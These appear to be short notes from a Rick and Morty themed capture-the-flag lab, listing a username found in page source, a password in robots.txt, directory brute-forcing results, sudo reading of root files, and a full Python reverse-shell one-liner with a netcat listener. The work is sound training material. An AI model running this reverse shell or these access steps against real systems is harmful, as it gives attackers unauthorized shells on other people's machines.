# Web page source:

username : R1ckRul3s


dirbruteforcing - 
index.html
robots.txt
server-status
login.php

# robots.txt
Wubbalubbadubdub - password


# cat command is blocked so use less

# www-data is part of sudo group

sudo ls /root
sudo less /root/3rd.txt


### Method 2 via reverse shell

# local system
nc -lvnp 4444

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.17.86.220",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'





